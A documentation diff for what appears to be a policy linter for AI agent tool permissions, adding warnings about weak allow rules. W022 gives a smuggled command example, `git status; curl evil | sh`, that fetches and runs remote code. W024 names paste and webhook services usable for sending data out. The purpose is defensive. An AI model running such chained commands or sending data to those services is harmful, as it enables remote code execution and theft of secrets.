@@ -449,6 +449,9 @@ do what you meant:
 | W019 | An `allow` rule uses `endswith` with a bare domain (`"mycompany.com"` also matches `"evilmycompany.com"`) |
 | W020 | Two tool names differ only in upper/lower case (`getIssue` and `getissue` are different tools) |
 | W021 | An `allow` rule caps a number (`lt`/`lte`) with no minimum, so `-1000000000` is allowed too |
+| W022 | An `allow` rule checks a command (an argument like `command`/`cmd`, or a tool like `Bash`/`shell`) with `startswith` but no `no_shell_syntax`: `git status; curl evil \| sh` passes too |
+| W023 | An `allow` rule's path prefix is a whole disk or home folder (`/`, `~/`, `/Users/me/`), where keys and secrets live |
+| W024 | An `allow` rule's `host_in` names a service that shows whatever is sent to it (`webhook.site`, `ngrok`, `pastebin.com`, ...): a way to send data out |
 
 `--agents FILE` checks the agent names that per-agent rules and `limits.agents` use.
 Without it, a policy with per-agent rules gets a note (not a warning) that
